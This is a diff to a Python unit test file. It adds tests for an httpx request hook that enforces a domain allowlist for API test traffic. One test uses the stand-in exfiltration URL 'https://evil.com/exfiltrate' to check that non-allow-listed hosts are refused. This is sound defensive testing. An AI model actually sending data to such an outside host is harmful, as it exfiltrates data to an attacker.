@@ -23,6 +23,7 @@ from __future__ import annotations
 
 from types import SimpleNamespace
 
+import httpx
 import pytest
 from fastapi import FastAPI
 from fastapi.testclient import TestClient
@@ -33,7 +34,12 @@ from sqlalchemy.pool import StaticPool
 from app.api import approvals, executions, projects, requirements
 from app.models.db import Base, get_db
 from app.models.entities import ExecutionRun, GeneratedArtifact
-from automation.conftest import DEFAULT_ALLOWED_DOMAINS, _allowed_domains, _host_allowed
+from automation.conftest import (
+    DEFAULT_ALLOWED_DOMAINS,
+    _allowed_domains,
+    _api_request_guard,
+    _host_allowed,
+)
 from tools.file_ingestion import MAX_FILE_SIZE_BYTES
 
 pytestmark = pytest.mark.unit
@@ -320,6 +326,36 @@ class TestDomainAllowlist:
             "example.com",
             "staging.example.org",
         ]
+
+
+class TestApiClientGuard:
+    """The api_client fixture's request hook enforces SEC-003 for non-browser
+    tests — the browser route guard cannot see httpx traffic."""
+
+    @staticmethod
+    def _client(domains: list[str]) -> httpx.Client:
+        transport = httpx.MockTransport(
+            lambda request: httpx.Response(200, json={"ok": True})
+        )
+        return httpx.Client(
+            base_url="http://localhost:8001",
+            transport=transport,
+            event_hooks={"request": [_api_request_guard(domains)]},
+        )
+
+    def test_allowed_host_passes(self):
+        with self._client(["localhost"]) as client:
+            assert client.get("/api/health").status_code == 200
+
+    def test_disallowed_host_refused_before_sending(self):
+        with self._client(["localhost"]) as client:
+            with pytest.raises(RuntimeError, match="non-allow-listed host"):
+                client.get("https://evil.com/exfiltrate")
+
+    def test_guard_fails_closed_on_empty_allowlist(self):
+        with self._client([]) as client:
+            with pytest.raises(RuntimeError, match="non-allow-listed host"):
+                client.get("/api/health")
 
 
 # ---------------------------------------------------------------------------
